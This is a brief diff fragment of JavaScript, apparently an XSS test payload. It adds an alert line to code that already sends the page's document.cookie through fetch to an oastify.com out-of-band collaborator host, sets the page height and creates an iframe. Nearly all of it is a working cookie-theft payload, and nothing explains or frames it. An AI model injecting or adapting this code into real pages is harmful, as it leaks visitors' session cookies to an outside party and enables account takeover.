@@ -1,3 +1,4 @@
+alert("Buzz Buxx");
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
 document.body.style.setProperty('height', '100vh')
 const iframe = document.createElement('iframe');
